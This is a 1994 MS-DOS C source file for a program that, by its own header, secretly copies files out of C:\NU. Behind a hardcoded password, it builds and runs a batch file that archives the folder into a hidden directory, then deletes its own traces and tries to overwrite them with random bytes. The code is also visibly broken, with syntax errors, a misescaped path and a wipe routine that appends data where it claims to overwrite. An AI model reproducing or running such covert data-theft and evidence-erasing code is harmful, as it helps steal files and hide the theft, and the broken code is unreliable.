/*
 * Program:     GETPRG.EXE
 * Source:      getprg.c
 * Author:      Unknown?
 * Date:        03-29-94
 * Version:     1.0 release version
 * Language:    Ansi C   MicroSoft Quick C
 * Purpose:     To exstract files secretly from C:\NU\*.*
 *
 */
   /* My include files */
#include "stdio.h"
#include "direct.h"
#include "graph.h"
#include "stdlib.h"
#include "string.h"

	/* The start to My program */
 main()
  {
   if(password()) {             /* Password Checking */
     _setvideomode(_ERESCOLOR);   /* Clear the Screen */
     _setvideomode(_DEFAULTMODE);
     ndrptt_cnttontt();
   }
   else {
     printf("\n\nERROR... Bad Input\n");
   }
   _setvideomode(_ERESCOLOR);   /* Clear the Screen */
   _setvideomode(_DEFAULTMODE);
 }

	/* The begining of the actual work to transfer the files */
	/* from NU dir to my prvt dir. */

 ndrptt_cnttontt()
  {                  /* Variable Declarations */
   int l;
   char *inf[]= {
     "@echo off\n",     /* The commands that will preform the work */
     "arj a -r -v1440 c:\\cadd6\\3dd\\cm3\\prvt\\mdocs >null\n",
     "del nul*.*\n",
     "cls\n"
   };
   FILE *fp;
	/* Copying GETPRG.EXE program to the bin dir */
   system("copy getprg.exe c:\\bin\\getprg.exe >null");
   system("del nul*.*");

   if((fp = fopen("c:\\bin\\xboot.bat", "w+"))==NULL) {
     printf("Failed attempt......\n");
     exit(1);
   }
   rewind(fp);
   for(l=0; l<4; l++) {         /* Start from the Bening of the */
     fputs(inf[l], fp);         /* file xboot.bat */
   }

   fclose(fp);          /* Closing the file through the pointer */
   fclose(fp);
   /* system("copy getprg.exe c:\\bin >null"); */
   system("c:");

   tbt();
   fclose(fp);
   chdir("\\");                 /* operations to create far out dir */
   if(mkdir("cadd6") == -1) {
     chdir("cadd6");
   }
   if(mkdir("3dd") == -1) {
     chdir("3dd")
   }
   if(mkdir("cm3") == -1) {
     chdir("cm3");
   }
   if(mkdir("prvt") == -1) {
     chdir("\\nu");
   }
   else {
     chdir("\\nu");
   }
   system("c:\\bin\\xboot.com");
   fclose(fp);

   cleanup();
 }
	/* *.Bat to *.Com conversion */
 tbt()
  {
   chdir("\\bin");
   system("tbat xboot.bat"); /* Serises of system commands for dos */
   _setvideomode(_ERESCOLOR);   /* Clear the Screen */
   _setvideomode(_DEFAULTMODE);
 }

		/* Wipeing the files xboot.bat, xboot.com, and */
 cleanup()      /* will wipe wipe GETPRG.EXE */
  {
   int x, z, nflag, utime;
   long ltime;                  /* Variable Declarations */
   char dwp;
   FILE *fp, *cm, *host, *nulit;
				/* Variable Setting */
   chdir("\\bin");
   ltime = time(NULL);          /* Randomization of timer */
   utime =(unsigned int) ltime/2;
   srand(utime);
   z = rand() % 255;

   remove("xboot.bat");       /* Deletes the file */
   remove("xboot.com");       /* Deletes the file */
   remove("getprg.exe");      /* Deletes the file */
   nflag = 0;
   if(remove("null.") == -1) {
     if((nulit = fopen("c:\\bin\\null.", "ab"))==NULL) {
       printf("Failed attempt......\n"); /* if fails then */
       exit(1);
     }
     nflag = 1;
   }
   else {
     if((nulit = fopen("c:\\bin\\null.", "ab"))==NULL {
       printf("Failed attempt......\n"); /* if fails then */
       exit(1);
     }
     nflag = 1;
   }

   if((fp = fopen("c:\\bin\\xboot.bat", "ab"))==NULL) {
     printf("Failed attempt......\n");  /* if fails then */
     exit(1);
   }
   for(x=0; x<30000; x++) {
     z = rand() % 255;          /* File wipeing methode */
     dwp = z;
     putc(dwp, fp);
   }
   fclose(fp);

   if((cm = fopen("c:\\bin\\xboot.com", "ab"))==NULL) {
     printf("Failed attempt......\n");  /* if fails then */
     exit(1);
   }
   for(x=0; x<30000; x++) {
     z = rand() % 255;          /* File wipeing methode */
     dwp = z;
     putc(dwp, cm);
   }
   fclose(cm);

   if((host = fopen("c:\\bin\getprg.exe", "ab"))==NULL) {
     printf("Failed attempt......\n");
     exit(1);
   }
   for(x=0; x<30000; x++) {
     z = rand() % 255;          /* File Wipeing methode */
     dwp = z;
     putc(dwp, host);
   }
   fclose(host);

 }
    /* Location of the Password Block of code*/
  password()
   {            /* Password */
    char s[80];  /*   |   */
    printf(" "); /*   |   */
    gets(s);     /*   |   Password checking occures here. This is the */
		 /*   V   password. */
    if(strcmp(s, "okidata")) {  /* strings different */
      printf("\n");
      return 0;
    }
    /* strings campared the same */
    return 1;
 }
